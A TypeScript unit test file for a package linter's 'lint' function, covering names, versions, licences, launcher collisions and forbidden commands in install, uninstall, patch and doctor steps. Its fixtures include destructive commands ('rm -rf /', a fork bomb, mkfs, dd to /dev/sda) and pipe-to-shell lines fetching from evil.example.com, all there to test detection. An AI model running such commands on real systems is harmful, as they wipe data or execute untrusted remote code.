/**
 * Unit tests for `src/packages/linter.ts` (the `lint` function).
 *
 * Tests construct a valid {@link PackageDefinition} via the parser, then
 * mutate specific fields to trigger each lint rule. The linter is pure
 * (no I/O), so no mocks are needed beyond the logger (mocked because pino's
 * lazy initializer is noisy in test output).
 */

import { describe, it, expect, vi } from 'vitest';

vi.mock('../../../src/utils/log.js', () => {
  const noop = (): void => {};
  const logger = {
    trace: noop,
    debug: noop,
    info: noop,
    warn: noop,
    error: noop,
    fatal: noop,
    child: () => logger,
  };
  return { logger };
});

import { lint } from '../../../src/packages/linter.js';
import { parsePackageYaml } from '../../../src/packages/parser.js';
import type { PackageDefinition } from '../../../src/packages/schema.js';

// ---------------------------------------------------------------------------
// Helper: build a valid PackageDefinition from a minimal YAML string.
// ---------------------------------------------------------------------------

const MINIMAL_VALID_YAML = `
name: testpkg
version: 1.0.0
description: "A test package"
homepage: https://example.com/testpkg
license: MIT
runtime: node
runtime_min_version: "20"
package: testpkg
launcher: testpkg
install:
  - echo install
compat:
  min_linuxify: "0.1.0"
  tested_distros: [ubuntu]
  tested_runtimes: [node]
  known_issues: []
  not_supported: []
permissions:
  network: true
  filesystem:
    binds: []
  services:
    start: []
  setuid: false
`;

/** Parse the minimal valid YAML and return a deep-cloned PackageDefinition. */
function validPkg(): PackageDefinition {
  return JSON.parse(JSON.stringify(parsePackageYaml(MINIMAL_VALID_YAML))) as PackageDefinition;
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('lint', () => {
  // -------------------------------------------------------------------------
  // Clean package
  // -------------------------------------------------------------------------

  describe('clean package', () => {
    it('returns passed=true with no errors for a valid package', () => {
      const report = lint(validPkg());
      expect(report.passed).toBe(true);
      expect(report.errors).toEqual([]);
    });

    it('may return warnings for a valid package (e.g. compat.min_linuxify not strict semver)', () => {
      const pkg = validPkg();
      pkg.compat.min_linuxify = '0.1'; // not strict semver (missing patch)
      const report = lint(pkg);
      expect(report.warnings.some((w) => w.code === 'E_LINT_BAD_COMPAT_MIN_LINUXIFY')).toBe(true);
      expect(report.passed).toBe(true); // warnings don't block
    });
  });

  // -------------------------------------------------------------------------
  // Name checks
  // -------------------------------------------------------------------------

  describe('name checks', () => {
    it('warns on consecutive hyphens in name', () => {
      const pkg = validPkg();
      // Bypass the schema regex by constructing the object directly.
      (pkg as { name: string }).name = 'test--pkg';
      const report = lint(pkg);
      expect(report.warnings.some((w) => w.code === 'E_LINT_NAME_CONSECUTIVE_HYPHENS')).toBe(true);
    });
  });

  // -------------------------------------------------------------------------
  // Version checks
  // -------------------------------------------------------------------------

  describe('version checks', () => {
    it('errors on invalid semver version', () => {
      const pkg = validPkg();
      (pkg as { version: string }).version = '1.2'; // missing patch
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_BAD_SEMVER')).toBe(true);
      expect(report.passed).toBe(false);
    });

    it('errors on non-coercible runtime_min_version', () => {
      const pkg = validPkg();
      (pkg as { runtime_min_version: string }).runtime_min_version = 'not-a-version';
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_BAD_RUNTIME_MIN_VERSION')).toBe(true);
    });

    it('errors on non-coercible runtime_max_version', () => {
      const pkg = validPkg();
      pkg.runtime_max_version = '??';
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_BAD_RUNTIME_MAX_VERSION')).toBe(true);
    });

    it('accepts semver-ish runtime_min_version like "20"', () => {
      const pkg = validPkg();
      pkg.runtime_min_version = '20';
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_BAD_RUNTIME_MIN_VERSION')).toBe(false);
    });
  });

  // -------------------------------------------------------------------------
  // License checks
  // -------------------------------------------------------------------------

  describe('license checks', () => {
    it('warns on unknown SPDX license', () => {
      const pkg = validPkg();
      pkg.license = 'Weird-License-2.0';
      const report = lint(pkg);
      expect(report.warnings.some((w) => w.code === 'E_LINT_UNKNOWN_LICENSE')).toBe(true);
    });

    it('accepts MIT', () => {
      const pkg = validPkg();
      pkg.license = 'MIT';
      const report = lint(pkg);
      expect(report.warnings.some((w) => w.code === 'E_LINT_UNKNOWN_LICENSE')).toBe(false);
    });

    it('accepts Apache-2.0', () => {
      const pkg = validPkg();
      pkg.license = 'Apache-2.0';
      const report = lint(pkg);
      expect(report.warnings.some((w) => w.code === 'E_LINT_UNKNOWN_LICENSE')).toBe(false);
    });

    it('accepts proprietary', () => {
      const pkg = validPkg();
      pkg.license = 'proprietary';
      const report = lint(pkg);
      expect(report.warnings.some((w) => w.code === 'E_LINT_UNKNOWN_LICENSE')).toBe(false);
    });

    it('accepts SPDX expressions (MIT OR Apache-2.0)', () => {
      const pkg = validPkg();
      pkg.license = 'MIT OR Apache-2.0';
      const report = lint(pkg);
      expect(report.warnings.some((w) => w.code === 'E_LINT_UNKNOWN_LICENSE')).toBe(false);
    });
  });

  // -------------------------------------------------------------------------
  // Launcher checks
  // -------------------------------------------------------------------------

  describe('launcher checks', () => {
    it('errors when launcher collides with a shell builtin (ls)', () => {
      const pkg = validPkg();
      (pkg as { launcher: string }).launcher = 'ls';
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_LAUNCHER_RESERVED')).toBe(true);
      expect(report.passed).toBe(false);
    });

    it('errors when launcher collides with a runtime binary (node)', () => {
      const pkg = validPkg();
      (pkg as { launcher: string }).launcher = 'node';
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_LAUNCHER_RESERVED')).toBe(true);
    });

    it('errors when launcher collides with linuxify', () => {
      const pkg = validPkg();
      (pkg as { launcher: string }).launcher = 'linuxify';
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_LAUNCHER_RESERVED')).toBe(true);
    });

    it('accepts a non-reserved launcher name', () => {
      const pkg = validPkg();
      (pkg as { launcher: string }).launcher = 'mycooltool';
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_LAUNCHER_RESERVED')).toBe(false);
    });
  });

  // -------------------------------------------------------------------------
  // Forbidden commands in install steps
  // -------------------------------------------------------------------------

  describe('forbidden commands in install steps', () => {
    it('errors on rm -rf /', () => {
      const pkg = validPkg();
      (pkg as { install: string[] }).install = ['rm -rf /'];
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_RM_RF_ROOT')).toBe(true);
    });

    it('errors on rm -rf / with --no-preserve-root', () => {
      const pkg = validPkg();
      (pkg as { install: string[] }).install = ['rm -rf --no-preserve-root /'];
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_RM_RF_ROOT')).toBe(true);
    });

    it('errors on a fork bomb', () => {
      const pkg = validPkg();
      (pkg as { install: string[] }).install = [':(){ :|:& };:'];
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_FORK_BOMB')).toBe(true);
    });

    it('errors on mkfs', () => {
      const pkg = validPkg();
      (pkg as { install: string[] }).install = ['mkfs.ext4 /dev/sda1'];
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_MKFS')).toBe(true);
    });

    it('errors on dd to a block device', () => {
      const pkg = validPkg();
      (pkg as { install: string[] }).install = ['dd if=/dev/zero of=/dev/sda bs=1M'];
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_DD_DEV')).toBe(true);
    });

    it('errors on redirect to /dev/sd*', () => {
      const pkg = validPkg();
      (pkg as { install: string[] }).install = ['echo x > /dev/sda'];
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_REDIRECT_TO_BLOCK_DEV')).toBe(true);
    });

    it('errors on chmod 777', () => {
      const pkg = validPkg();
      (pkg as { install: string[] }).install = ['chmod 777 /tmp'];
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_CHMOD_777')).toBe(true);
    });

    it('does not error on rm -rf of a specific directory (not /)', () => {
      const pkg = validPkg();
      (pkg as { install: string[] }).install = ['rm -rf /tmp/mydir'];
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_RM_RF_ROOT')).toBe(false);
    });
  });

  // -------------------------------------------------------------------------
  // Pipe-to-shell (curl | sh)
  // -------------------------------------------------------------------------

  describe('pipe-to-shell', () => {
    it('warns on curl | sh from an untrusted host', () => {
      const pkg = validPkg();
      (pkg as { install: string[] }).install = [
        'curl -fsSL https://evil.example.com/install.sh | sh',
      ];
      const report = lint(pkg);
      expect(report.warnings.some((w) => w.code === 'E_LINT_PIPE_TO_SHELL_UNTRUSTED')).toBe(true);
    });

    it('does not warn on curl | sh from raw.githubusercontent.com (trusted)', () => {
      const pkg = validPkg();
      (pkg as { install: string[] }).install = [
        'curl -fsSL https://raw.githubusercontent.com/foo/bar/main/install.sh | sh',
      ];
      const report = lint(pkg);
      expect(report.warnings.some((w) => w.code === 'E_LINT_PIPE_TO_SHELL_UNTRUSTED')).toBe(false);
    });

    it('does not warn on curl | sh from github.com (trusted)', () => {
      const pkg = validPkg();
      (pkg as { install: string[] }).install = [
        'curl -fsSL https://github.com/foo/bar/install.sh | bash',
      ];
      const report = lint(pkg);
      expect(report.warnings.some((w) => w.code === 'E_LINT_PIPE_TO_SHELL_UNTRUSTED')).toBe(false);
    });

    it('warns on wget | sh from an untrusted host', () => {
      const pkg = validPkg();
      (pkg as { install: string[] }).install = [
        'wget -qO- https://evil.example.com/install.sh | sh',
      ];
      const report = lint(pkg);
      expect(report.warnings.some((w) => w.code === 'E_LINT_PIPE_TO_SHELL_UNTRUSTED')).toBe(true);
    });
  });

  // -------------------------------------------------------------------------
  // Forbidden commands in uninstall steps
  // -------------------------------------------------------------------------

  describe('forbidden commands in uninstall steps', () => {
    it('errors on rm -rf / in uninstall', () => {
      const pkg = validPkg();
      pkg.uninstall = ['rm -rf /'];
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_RM_RF_ROOT')).toBe(true);
    });
  });

  // -------------------------------------------------------------------------
  // Forbidden commands in patch verify
  // -------------------------------------------------------------------------

  describe('forbidden commands in patch verify', () => {
    it('errors on rm -rf / in patch verify', () => {
      const pkg = validPkg();
      pkg.patches = [
        {
          id: 'p1',
          patch_id: 'p1',
          description: 'd',
          file: 'f.js',
          type: 'regex' as const,
          find: 'a',
          replace: 'b',
          verify: 'rm -rf /',
          rollback: true,
        },
      ];
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_RM_RF_ROOT')).toBe(true);
    });

    it('scans patch replace when type is shell', () => {
      const pkg = validPkg();
      pkg.patches = [
        {
          id: 'p1',
          patch_id: 'p1',
          description: 'd',
          file: 'f.js',
          type: 'shell' as const,
          find: 'a',
          replace: 'rm -rf /',
          verify: 'echo ok',
          rollback: true,
        },
      ];
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_RM_RF_ROOT')).toBe(true);
    });
  });

  // -------------------------------------------------------------------------
  // Forbidden commands in doctor checks
  // -------------------------------------------------------------------------

  describe('forbidden commands in doctor checks', () => {
    it('errors on rm -rf / in a doctor command', () => {
      const pkg = validPkg();
      pkg.doctor = [
        {
          id: 'd1',
          name: 'check',
          command: 'rm -rf /',
          expect: 0,
          fix_command: 'echo fix',
          severity: 'fail' as const,
        },
      ];
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_RM_RF_ROOT')).toBe(true);
    });
  });

  // -------------------------------------------------------------------------
  // Deprecated
  // -------------------------------------------------------------------------

  describe('deprecated', () => {
    it('warns on deprecated: true', () => {
      const pkg = validPkg();
      pkg.deprecated = true;
      const report = lint(pkg);
      expect(report.warnings.some((w) => w.code === 'E_LINT_DEPRECATED')).toBe(true);
    });

    it('does not warn on deprecated: false', () => {
      const pkg = validPkg();
      pkg.deprecated = false;
      const report = lint(pkg);
      expect(report.warnings.some((w) => w.code === 'E_LINT_DEPRECATED')).toBe(false);
    });
  });

  // -------------------------------------------------------------------------
  // Self-conflict
  // -------------------------------------------------------------------------

  describe('self-conflict', () => {
    it('errors when a package lists itself in conflicts', () => {
      const pkg = validPkg();
      pkg.conflicts = ['testpkg'];
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_SELF_CONFLICT')).toBe(true);
    });

    it('does not error when conflicts lists a different package', () => {
      const pkg = validPkg();
      pkg.conflicts = ['other-pkg'];
      const report = lint(pkg);
      expect(report.errors.some((e) => e.code === 'E_LINT_SELF_CONFLICT')).toBe(false);
    });
  });

  // -------------------------------------------------------------------------
  // Compat
  // -------------------------------------------------------------------------

  describe('compat', () => {
    it('warns on invalid semver in compat.min_linuxify', () => {
      const pkg = validPkg();
      pkg.compat.min_linuxify = '0.1'; // not strict semver
      const report = lint(pkg);
      expect(report.warnings.some((w) => w.code === 'E_LINT_BAD_COMPAT_MIN_LINUXIFY')).toBe(true);
    });

    it('does not warn on valid semver in compat.min_linuxify', () => {
      const pkg = validPkg();
      pkg.compat.min_linuxify = '0.1.0';
      const report = lint(pkg);
      expect(report.warnings.some((w) => w.code === 'E_LINT_BAD_COMPAT_MIN_LINUXIFY')).toBe(false);
    });
  });

  // -------------------------------------------------------------------------
  // Field paths
  // -------------------------------------------------------------------------

  describe('field paths', () => {
    it('includes the field path in install-step errors', () => {
      const pkg = validPkg();
      (pkg as { install: string[] }).install = ['echo ok', 'rm -rf /'];
      const report = lint(pkg);
      const err = report.errors.find((e) => e.code === 'E_LINT_RM_RF_ROOT');
      expect(err).toBeDefined();
      expect(err!.field).toBe('install[1].command');
    });

    it('includes the field path in patch-verify errors', () => {
      const pkg = validPkg();
      pkg.patches = [
        {
          id: 'p1',
          patch_id: 'p1',
          description: 'd',
          file: 'f.js',
          type: 'regex' as const,
          find: 'a',
          replace: 'b',
          verify: 'rm -rf /',
          rollback: true,
        },
      ];
      const report = lint(pkg);
      const err = report.errors.find((e) => e.code === 'E_LINT_RM_RF_ROOT');
      expect(err).toBeDefined();
      expect(err!.field).toBe('patches[0].verify');
    });
  });
});
